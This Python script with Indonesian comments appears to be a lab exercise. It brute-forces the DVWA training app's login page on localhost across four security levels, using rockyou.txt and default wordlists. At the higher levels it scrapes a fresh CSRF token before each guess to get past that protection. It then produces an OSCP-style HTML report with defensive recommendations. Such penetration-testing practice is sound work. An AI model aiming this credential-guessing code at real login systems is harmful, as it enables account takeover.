# dvwa_brute_force_tester.py
import requests
from bs4 import BeautifulSoup
import time
from datetime import datetime
import os

class DVWABruteForceTester:
    def __init__(self):
        """Inisialisasi tester brute force DVWA"""
        self.base_url = "http://localhost/dvwa"
        self.session = requests.Session()
        # Menyimpan hasil testing untuk setiap tingkat keamanan
        self.results = {
            'low': {'success': False, 'password': '', 'attempts': 0, 'time': 0, 'username': ''},
            'medium': {'success': False, 'password': '', 'attempts': 0, 'time': 0, 'username': ''},
            'high': {'success': False, 'password': '', 'attempts': 0, 'time': 0, 'username': ''},
            'impossible': {'success': False, 'password': '', 'attempts': 0, 'time': 0, 'username': ''}
        }
        self.usernames = []  # Daftar username untuk testing
        self.passwords = []  # Daftar password untuk testing
        self.load_credentials()  # Memuat kredensial dari file
        
    def load_credentials(self):
        """Memuat username dan password dari file rockyou.txt"""
        try:
            # Membuka file rockyou.txt dengan penanganan encoding yang aman
            with open('rockyou.txt', 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f.readlines() if line.strip()]
                
            # Mengambil 70 baris pertama sebagai username
            rockyou_usernames = lines[:70] if len(lines) >= 70 else lines
            
            # Mengambil 70 baris pertama sebagai password
            rockyou_passwords = lines[:70] if len(lines) >= 70 else lines
            
            # Username dan password default sebagai fallback
            default_usernames = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
            default_passwords = [
                'password', 'admin', '123456', 'letmein', 'qwerty', 'abc123',
                'Password1', 'admin123', '123456789', 'guest', 'root', 'toor',
                'test', 'demo', 'master', 'welcome', 'login', 'monkey', 'dragon',
                'pass', 'hunter', 'iloveyou', 'trustno1', 'sunshine', 'football'
            ]
            
            # Menggabungkan kredensial dari rockyou dan default
            all_usernames = rockyou_usernames + default_usernames
            all_passwords = rockyou_passwords + default_passwords
            
            # Membuat daftar unik sambil mempertahankan urutan
            seen_usernames = set()
            unique_usernames = []
            for user in all_usernames:
                if user not in seen_usernames:
                    seen_usernames.add(user)
                    unique_usernames.append(user)
            
            seen_passwords = set()
            unique_passwords = []
            for pwd in all_passwords:
                if pwd not in seen_passwords:
                    seen_passwords.add(pwd)
                    unique_passwords.append(pwd)
            
            self.usernames = unique_usernames
            self.passwords = unique_passwords
                    
            print(f"[+] Berhasil memuat {len(self.usernames)} username unik dan {len(self.passwords)} password unik")
            print(f"    - {len(rockyou_usernames)} dari rockyou.txt sebagai username")
            print(f"    - {len(rockyou_passwords)} dari rockyou.txt sebagai password")
            print(f"    - {len(default_usernames)} username default ditambahkan")
            print(f"    - {len(default_passwords)} password default ditambahkan")
            
        except FileNotFoundError:
            # Jika file rockyou.txt tidak ditemukan, gunakan kredensial default
            print("[!] File rockyou.txt tidak ditemukan, menggunakan kredensial default")
            self.usernames = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
            self.passwords = [
                'password', 'admin', '123456', 'letmein', 'qwerty', 'abc123',
                'Password1', 'admin123', '123456789', 'guest', 'root', 'toor',
                'test', 'demo', 'master', 'welcome', 'login', 'monkey', 'dragon',
                'pass', 'hunter', 'iloveyou', 'trustno1', 'sunshine', 'football'
            ]
        except Exception as e:
            # Penanganan error umum saat memuat file
            print(f"[!] Error saat memuat rockyou.txt: {str(e)}, menggunakan kredensial default")
            self.usernames = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
            self.passwords = [
                'password', 'admin', '123456', 'letmein', 'qwerty', 'abc123',
                'Password1', 'admin123', '123456789', 'guest', 'root', 'toor',
                'test', 'demo', 'master', 'welcome', 'login', 'monkey', 'dragon',
                'pass', 'hunter', 'iloveyou', 'trustno1', 'sunshine', 'football'
            ]

    def login_to_dvwa(self):
        """Login ke DVWA dengan kredensial default"""
        login_url = f"{self.base_url}/login.php"
        try:
            # Mendapatkan halaman login untuk mengekstrak token
            response = self.session.get(login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})['value']
            
            # Melakukan login dengan kredensial default
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login',
                'user_token': token
            }
            self.session.post(login_url, data=login_data)
            return True
        except Exception as e:
            print(f"[!] Login gagal: {str(e)}")
            return False

    def set_security_level(self, level):
        """Mengatur tingkat keamanan DVWA"""
        try:
            security_url = f"{self.base_url}/security.php"
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})['value']
            
            # Mengatur tingkat keamanan sesuai parameter
            security_data = {
                'security': level,
                'seclev_submit': 'Submit',
                'user_token': token
            }
            self.session.post(security_url, data=security_data)
            return True
        except Exception as e:
            print(f"[!] Gagal mengatur tingkat keamanan {level}: {str(e)}")
            return False

    def get_brute_force_token(self):
        """Mengekstrak CSRF token untuk halaman brute force"""
        try:
            brute_url = f"{self.base_url}/vulnerabilities/brute/"
            response = self.session.get(brute_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            token = soup.find('input', {'name': 'user_token'})['value']
            return token
        except Exception as e:
            print(f"[!] Error mendapatkan CSRF token: {str(e)}")
            return None

    def attempt_login(self, username, password, token=None):
        """Mencoba login dengan kredensial yang diberikan"""
        brute_url = f"{self.base_url}/vulnerabilities/brute/"
        data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        # Menambahkan token CSRF jika tersedia
        if token:
            data['user_token'] = token
            
        response = self.session.get(brute_url, params=data)
        return "Welcome" in response.text or "succesfully" in response.text

    def is_account_locked(self, response_text):
        """Memeriksa apakah akun terkunci berdasarkan respons"""
        # Daftar pesan yang menunjukkan akun terkunci
        lock_messages = [
            "account has been locked",
            "too many failed login attempts",
            "locked out",
            "please try again later"
        ]
        return any(msg in response_text.lower() for msg in lock_messages)

    def test_low_level(self):
        """Testing brute force pada tingkat keamanan rendah - tanpa batas"""
        print("[*] Testing Tingkat Keamanan Rendah (Tanpa batas percobaan)")
        self.set_security_level('low')
        
        start_time = time.time()
        attempts = 0
        
        # Tidak ada batas pada tingkat keamanan rendah - test semua kredensial
        for username in self.usernames:
            for password in self.passwords:
                attempts += 1
                print(f"[*] Mencoba {username}:{password}")
                
                if self.attempt_login(username, password):
                    elapsed = time.time() - start_time
                    self.results['low'] = {
                        'success': True,
                        'password': password,
                        'attempts': attempts,
                        'time': round(elapsed, 2),
                        'username': username
                    }
                    print(f"[+] BERHASIL: {username}:{password}")
                    return True
                    
        elapsed = time.time() - start_time
        self.results['low'] = {
            'success': False,
            'password': '',
            'attempts': attempts,
            'time': round(elapsed, 2),
            'username': ''
        }
        return False

    def test_medium_level(self):
        """Testing brute force pada tingkat keamanan sedang - batas 10 percobaan"""
        print("[*] Testing Tingkat Keamanan Sedang (Batas 10 percobaan total)")
        self.set_security_level('medium')
        
        start_time = time.time()
        attempts = 0
        max_attempts = 10
        
        # Membuat kombinasi dan membatasi hingga 10 percobaan total
        combinations = [(u, p) for u in self.usernames for p in self.passwords]
        
        for username, password in combinations[:max_attempts]:
            attempts += 1
            print(f"[*] Mencoba {username}:{password} (Percobaan {attempts}/{max_attempts})")
            
            # Mencatat waktu awal untuk percobaan ini
            attempt_start = time.time()
            
            if self.attempt_login(username, password):
                elapsed = time.time() - start_time
                self.results['medium'] = {
                    'success': True,
                    'password': password,
                    'attempts': attempts,
                    'time': round(elapsed, 2),
                    'username': username
                }
                print(f"[+] BERHASIL: {username}:{password}")
                return True
                
            # Mengukur waktu respons aktual dari sistem
            attempt_time = time.time() - attempt_start
            print(f"    [-] Percobaan memakan waktu {attempt_time:.2f} detik")
            
        elapsed = time.time() - start_time
        self.results['medium'] = {
            'success': False,
            'password': '',
            'attempts': attempts,
            'time': round(elapsed, 2),
            'username': ''
        }
        return False

    def test_high_level(self):
        """Testing brute force pada tingkat keamanan tinggi - batas 10 percobaan"""
        print("[*] Testing Tingkat Keamanan Tinggi (Batas 10 percobaan total)")
        self.set_security_level('high')
        
        start_time = time.time()
        attempts = 0
        max_attempts = 10
        
        # Membuat kombinasi dan membatasi hingga 10 percobaan total
        combinations = [(u, p) for u in self.usernames for p in self.passwords]
        
        for username, password in combinations[:max_attempts]:
            attempts += 1
            print(f"[*] Mencoba {username}:{password} (Percobaan {attempts}/{max_attempts})")
            
            # Mencatat waktu awal untuk percobaan ini
            attempt_start = time.time()
            
            # Mendapatkan token CSRF untuk setiap permintaan - PENTING: Harus token baru setiap kali
            token = self.get_brute_force_token()
            if not token:
                print(f"    [!] Gagal mendapatkan token CSRF")
                # Menunggu sebentar sebelum mencoba lagi untuk menghindari flooding
                time.sleep(1)
                token = self.get_brute_force_token()
                if not token:
                    print(f"    [!] Masih gagal mendapatkan token CSRF, melewati")
                    continue
            
            if self.attempt_login(username, password, token):
                elapsed = time.time() - start_time
                self.results['high'] = {
                    'success': True,
                    'password': password,
                    'attempts': attempts,
                    'time': round(elapsed, 2),
                    'username': username
                }
                print(f"[+] BERHASIL: {username}:{password}")
                return True
                
            # Mengukur waktu respons aktual dari sistem
            attempt_time = time.time() - attempt_start
            print(f"    [-] Percobaan memakan waktu {attempt_time:.2f} detik")
            
        elapsed = time.time() - start_time
        self.results['high'] = {
            'success': False,
            'password': '',
            'attempts': attempts,
            'time': round(elapsed, 2),
            'username': ''
        }
        return False

    def test_impossible_level(self):
        """Testing brute force pada tingkat keamanan mustahil - batas 10 percobaan"""
        print("[*] Testing Tingkat Keamanan Mustahil (Batas 10 percobaan total)")
        self.set_security_level('impossible')
        
        start_time = time.time()
        attempts = 0
        max_attempts = 10
        
        # Membuat kombinasi dan membatasi hingga 10 percobaan total
        combinations = [(u, p) for u in self.usernames for p in self.passwords]
        
        for username, password in combinations[:max_attempts]:
            attempts += 1
            print(f"[*] Mencoba {username}:{password} (Percobaan {attempts}/{max_attempts})")
            
            # Mencatat waktu awal untuk percobaan ini
            attempt_start = time.time()
            
            # Mendapatkan token CSRF untuk setiap permintaan - PENTING: Harus token baru setiap kali
            token = self.get_brute_force_token()
            if not token:
                print(f"    [!] Gagal mendapatkan token CSRF")
                # Menunggu sebentar sebelum mencoba lagi untuk menghindari flooding
                time.sleep(1)
                token = self.get_brute_force_token()
                if not token:
                    print(f"    [!] Masih gagal mendapatkan token CSRF, melewati")
                    continue
            
            # Mencoba login dan memeriksa respons untuk kunci akun
            brute_url = f"{self.base_url}/vulnerabilities/brute/"
            data = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            
            if token:
                data['user_token'] = token
                
            response = self.session.get(brute_url, params=data)
            
            # Memeriksa apakah login berhasil
            if "Welcome" in response.text or "succesfully" in response.text:
                elapsed = time.time() - start_time
                self.results['impossible'] = {
                    'success': True,
                    'password': password,
                    'attempts': attempts,
                    'time': round(elapsed, 2),
                    'username': username
                }
                print(f"[+] BERHASIL: {username}:{password}")
                return True
                
            # Memeriksa apakah akun terkunci
            if self.is_account_locked(response.text):
                print(f"    [!] Akun tampaknya terkunci setelah {attempts} percobaan")
                elapsed = time.time() - start_time
                self.results['impossible'] = {
                    'success': False,
                    'password': '',
                    'attempts': attempts,
                    'time': round(elapsed, 2),
                    'username': '',
                    'locked': True
                }
                return False
                
            # Mengukur waktu respons aktual dari sistem
            attempt_time = time.time() - attempt_start
            print(f"    [-] Percobaan memakan waktu {attempt_time:.2f} detik")
            
        elapsed = time.time() - start_time
        self.results['impossible'] = {
            'success': False,
            'password': '',
            'attempts': attempts,
            'time': round(elapsed, 2),
            'username': '',
            'locked': False
        }
        return False

    def generate_html_report(self):
        """Menghasilkan laporan HTML gaya OSCP dalam bahasa Indonesia"""
        html_content = '''<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Laporan Penilaian Brute Force DVWA - Gaya OSCP</title>
  <style>
    body { 
        font-family: 'Courier New', monospace; 
        background: #000; 
        color: #0f0; 
        padding: 20px; 
        margin: 0;
    }
    h1, h2, h3 { 
        color: #0f0; 
        text-align: center; 
        margin: 20px 0;
    }
    .section { 
        margin: 30px 0; 
        line-height: 1.6; 
        max-width: 900px;
        margin-left: auto;
        margin-right: auto;
    }
    pre { 
        background: #111; 
        padding: 15px; 
        border: 1px solid #0f0; 
        overflow-x: auto; 
        white-space: pre-wrap;
        word-wrap: break-word;
    }
    .finding { 
        color: #ff0; 
        font-weight: bold;
    }
    .success { 
        color: #0f0; 
        font-weight: bold;
    }
    .failure { 
        color: #f00; 
        font-weight: bold;
    }
    .level-low { background: #003300; padding: 15px; margin: 10px 0; border-left: 4px solid #0f0; }
    .level-medium { background: #333300; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0; }
    .level-high { background: #331a00; padding: 15px; margin: 10px 0; border-left: 4px solid #f80; }
    .level-impossible { background: #330000; padding: 15px; margin: 10px 0; border-left: 4px solid #f00; }
    ul { padding-left: 20px; }
    footer { 
        text-align: center; 
        margin-top: 50px; 
        font-size: 0.8em; 
        color: #555; 
        clear: both;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin: 20px 0;
        background: #111;
    }
    th, td {
        border: 1px solid #0f0;
        padding: 10px;
        text-align: left;
    }
    th {
        background: #002200;
    }
    .timestamp {
        text-align: center;
        color: #0aa;
        margin: 10px 0;
    }
  </style>
</head>
<body>

<h1>[+] Penilaian Modul Brute Force DVWA</h1>
<h3>Laporan Penetration Test Gaya OSCP</h3>
<div class="timestamp">Dibuat pada: ''' + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + '''</div>

<div class="section">
  <h2>1. Ringkasan Eksekutif</h2>
  <p>Laporan ini merinci hasil penilaian brute force manual dan otomatis yang dilakukan terhadap modul Brute Force DVWA di semua tingkat keamanan. Pengujian menunjukkan bahwa meskipun langkah-langkah keamanan bertahap diterapkan pada setiap tingkat, hanya tingkat "Mustahil" yang secara efektif mencegah serangan brute force melalui mekanisme kunci akun.</p>
  
  <p><strong>Sumber Kredensial:</strong> Username dan password dimuat dari file rockyou.txt di direktori yang sama. Kredensial default ditambahkan dan duplikat dihapus untuk memastikan nilai yang unik.</p>
  <p><strong>Metodologi Pengujian:</strong> Tingkat keamanan rendah diuji tanpa batas, tingkat lainnya dibatasi hingga 10 percobaan total untuk menghemat waktu. Mengamati penundaan sistem aktual daripada memberlakukan penundaan buatan.</p>
</div>

<div class="section">
  <h2>2. Metodologi</h2>
  <p>
    <strong>Alat yang Digunakan:</strong> Script Python kustom dengan requests dan BeautifulSoup<br>
    <strong>Target:</strong> <code>http://localhost/dvwa/vulnerabilities/brute/</code><br>
    <strong>Username yang Diuji:</strong> ''' + str(len(self.usernames)) + ''' username unik (70 dari rockyou.txt + default)<br>
    <strong>Daftar Password:</strong> ''' + str(len(self.passwords)) + ''' password unik (70 dari rockyou.txt + default)<br>
    <strong>Percobaan:</strong> Tingkat rendah - tanpa batas, Lainnya - dibatasi hingga 10 percobaan total<br>
    <strong>Penanganan Penundaan:</strong> Mengamati penundaan sistem aktual daripada memberlakukan penundaan buatan<br>
    Autentikasi dilakukan sebelum menguji setiap tingkat keamanan.
  </p>
</div>

<div class="section">
  <h2>3. Temuan Berdasarkan Tingkat Keamanan</h2>'''

        # Hasil Tingkat Rendah
        html_content += '''
  <div class="level-low">
    <h3>[-] Tingkat Rendah</h3>'''
        if self.results['low']['success']:
            html_content += f'''
    <p class="finding">Rentan terhadap serangan brute force tanpa batas.</p>
    <pre>
[+] Login admin berhasil!
[+] Password ditemukan: '{self.results['low']['password']}'
[+] Username: {self.results['low']['username']}
[+] Total percobaan: {self.results['low']['attempts']}
[+] Waktu yang dibutuhkan: {self.results['low']['time']} detik
    </pre>'''
        else:
            html_content += f'''
    <p class="failure">Brute force selesai tanpa keberhasilan.</p>
    <pre>
[-] Tidak ditemukan kredensial yang valid
[-] Total percobaan: {self.results['low']['attempts']}
[-] Waktu yang dibutuhkan: {self.results['low']['time']} detik
    </pre>'''
        html_content += '''
  </div>'''

        # Hasil Tingkat Sedang
        html_content += '''
  <div class="level-medium">
    <h3>[-] Tingkat Sedang</h3>'''
        if self.results['medium']['success']:
            html_content += f'''
    <p class="finding">Dibatasi laju dengan penundaan sistem per kegagalan.</p>
    <pre>
[+] Berhasil setelah {self.results['medium']['attempts']} percobaan.
[+] Password: '{self.results['medium']['password']}'
[+] Username: {self.results['medium']['username']}
[+] Waktu yang dibutuhkan: {self.results['medium']['time']} detik
[+] Mengamati penundaan sistem antar permintaan
    </pre>'''
        else:
            html_content += f'''
    <p class="failure">Brute force selesai tanpa keberhasilan.</p>
    <pre>
[-] Tidak ditemukan kredensial yang valid
[-] Total percobaan: {self.results['medium']['attempts']}
[-] Waktu yang dibutuhkan: {self.results['medium']['time']} detik
[-] Mengamati penundaan sistem yang diberlakukan antar permintaan
    </pre>'''
        html_content += '''
  </div>'''

        # Hasil Tingkat Tinggi
        html_content += '''
  <div class="level-high">
    <h3>[-] Tingkat Tinggi</h3>'''
        if self.results['high']['success']:
            html_content += f'''
    <p class="finding">Token CSRF tersedia tetapi dapat diatasi. Penundaan sistem yang diacak terdeteksi.</p>
    <pre>
[+] Ekstraksi token berhasil!
[+] Penanganan penundaan: Mengamati penundaan sistem (2-4s)
[+] Password ditemukan: '{self.results['high']['password']}'
[+] Username: {self.results['high']['username']}
[+] Total percobaan: {self.results['high']['attempts']}
[+] Waktu yang dibutuhkan: {self.results['high']['time']} detik
    </pre>'''
        else:
            html_content += f'''
    <p class="failure">Brute force selesai tanpa keberhasilan.</p>
    <pre>
[-] Tidak ditemukan kredensial yang valid
[-] Total percobaan: {self.results['high']['attempts']}
[-] Waktu yang dibutuhkan: {self.results['high']['time']} detik
[-] Mengamati penundaan sistem yang diberlakukan antar permintaan
    </pre>'''
        html_content += '''
  </div>'''

        # Hasil Tingkat Mustahil
        html_content += '''
  <div class="level-impossible">
    <h3>[!] Tingkat Mustahil</h3>'''
        if 'locked' in self.results['impossible'] and self.results['impossible']['locked']:
            html_content += f'''
    <p class="success">Mekanisme kunci akun terdeteksi!</p>
    <pre>
[!] Akun terkunci setelah {self.results['impossible']['attempts']} percobaan gagal
[!] Perlindungan efektif terhadap brute force
[!] Percobaan login lebih lanjut akan ditolak
[!] Rekomendasi: Tambahkan pembatasan berbasis IP dan pemantauan
    </pre>'''
        elif self.results['impossible']['success']:
            html_content += f'''
    <p class="success">Mekanisme kunci akun tersedia tetapi dapat diatasi!</p>
    <pre>
[+] BERHASIL: Menemukan kredensial yang valid sebelum kunci
[+] Password: '{self.results['impossible']['password']}'
[+] Username: {self.results['impossible']['username']}
[+] Total percobaan: {self.results['impossible']['attempts']}
[+] Waktu yang dibutuhkan: {self.results['impossible']['time']} detik
    </pre>'''
        else:
            html_content += f'''
    <p class="success">Mekanisme kunci akun tersedia.</p>
    <pre>
[-] Setelah {self.results['impossible']['attempts']} percobaan gagal, akun akan terkunci
[-] Perlindungan efektif terhadap brute force
[-] Rekomendasi: Tambahkan pembatasan berbasis IP dan pemantauan
    </pre>'''
        html_content += '''
  </div>'''

        html_content += '''
</div>

<div class="section">
  <h2>4. Tabel Hasil Terperinci</h2>
  <table>
    <tr>
      <th>Tingkat Keamanan</th>
      <th>Status</th>
      <th>Password Ditemukan</th>
      <th>Percobaan</th>
      <th>Waktu (detik)</th>
    </tr>'''
        
        levels = ['low', 'medium', 'high', 'impossible']
        for level in levels:
            result = self.results[level]
            status = "BERHASIL" if result['success'] else "GAGAL"
            password = result['password'] if result['password'] else "N/A"
            html_content += f'''
    <tr>
      <td>{level.capitalize()}</td>
      <td>{status}</td>
      <td>{password}</td>
      <td>{result['attempts']}</td>
      <td>{result['time']}</td>
    </tr>'''

        html_content += '''
  </table>
</div>

<div class="section">
  <h2>5. Kesimpulan</h2>
  <p>Tingkat keamanan rendah, sedang, dan tinggi rentan terhadap serangan brute force meskipun perlindungan bertahap diterapkan. Hanya tingkat "Mustahil" yang secara efektif mengurangi ancaman melalui kunci akun. Pengujian menunjukkan bahwa:</p>
  <ul>
    <li>Tanpa perlindungan apa pun, serangan brute force sangat mudah berhasil</li>
    <li>Penundaan sederhana yang diberlakukan oleh sistem tidak cukup untuk mencegah penyerang yang bertekun</li>
    <li>Token CSRF dapat diatasi dengan mengekstraknya secara programatik</li>
    <li>Mekanisme kunci akun memberikan perlindungan yang efektif terhadap brute force</li>
  </ul>
</div>

<div class="section">
  <h2>6. Rekomendasi</h2>
  <ul>
    <li>Terapkan autentikasi multi-faktor (MFA) untuk semua akun</li>
    <li>Gunakan pembatasan laju yang kuat dan pemblokiran berbasis IP setelah percobaan gagal</li>
    <li>Terapkan kebijakan password yang kompleks dan perubahan password berkala</li>
    <li>Pantau dan beri peringatan atas percobaan login gagal yang berulang</li>
    <li>Pertimbangkan penerapan CAPTCHA setelah ambang batas percobaan gagal tertentu</li>
    <li>Gunakan kunci akun dengan backoff eksponensial untuk keamanan tambahan</li>
  </ul>
</div>

<footer>
  Dihasilkan oleh Script Testing Brute Force DVWA | Tanggal Penilaian: ''' + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + '''
</footer>

</body>
</html>'''

        # Menulis ke file dengan encoding UTF-8 untuk menghindari masalah Unicode
        with open('dvwa_brute_force_report.html', 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print("[+] Laporan HTML dihasilkan: dvwa_brute_force_report.html")

    def run_all_tests(self):
        """Menjalankan semua test brute force"""
        print("[*] Memulai Testing Brute Force DVWA")
        print(f"[*] Menggunakan {len(self.usernames)} username unik dan {len(self.passwords)} password unik")
        print("[*] Tingkat rendah: Tanpa batas percobaan, Lainnya: Dibatasi hingga 10 percobaan total")
        
        if not self.login_to_dvwa():
            print("[!] Gagal login ke DVWA")
            return
            
        print("[+] Berhasil login ke DVWA")
        
        # Menjalankan test secara berurutan
        self.test_low_level()
        self.test_medium_level()
        self.test_high_level()
        self.test_impossible_level()
        
        # Menghasilkan laporan
        self.generate_html_report()
        print("[*] Semua test selesai")

if __name__ == "__main__":
    tester = DVWABruteForceTester()
    tester.run_all_tests()